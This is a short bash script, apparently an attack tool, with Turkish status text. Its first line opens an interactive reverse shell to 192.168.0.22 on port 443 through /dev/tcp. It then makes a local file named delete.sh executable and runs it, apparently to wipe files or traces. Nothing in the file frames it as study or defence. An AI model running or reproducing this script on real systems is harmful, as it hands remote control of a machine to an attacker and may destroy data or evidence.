#!/bin/bash

bash -i >&/dev/tcp/192.168.0.22/443 0>&1

sleep 2

if [ -f "delete.sh" ]; then
    echo "[+] delete.sh çalıştırılıyor..."
    chmod +x delete.sh 2>/dev/null
    ./delete.sh
fi
